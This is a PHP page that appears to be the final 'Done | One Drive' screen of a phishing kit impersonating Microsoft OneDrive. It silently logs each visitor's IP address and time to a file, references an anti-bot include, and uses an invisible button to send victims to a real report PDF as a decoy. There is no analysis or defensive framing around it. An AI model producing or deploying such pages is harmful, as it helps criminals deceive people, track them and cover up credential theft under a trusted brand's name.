<?php 
$file = fopen ('ip.txt', 'a+'); 
fwrite($file, $_SERVER['REMOTE_ADDR']."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\r\n") 
?>
<?php

/*

 */

//include 'antibots.php';

session_start();

?>
<html>
<head>
	<title>Done | One Drive</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico" />
	<style>
<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}
</style>
</style>
<body background="img/002.png">

<button onclick="window.location.href='http://unctad.org/en/PublicationsLibrary/wir2018_en.pdf'" style="position: absolute; top: 370px; left: 550px; width: 250px; height:58px; background-color: Transparent;background-repeat:no-repeat;border: none;cursor:pointer;overflow: hidden;"></button>


</body>
</html>
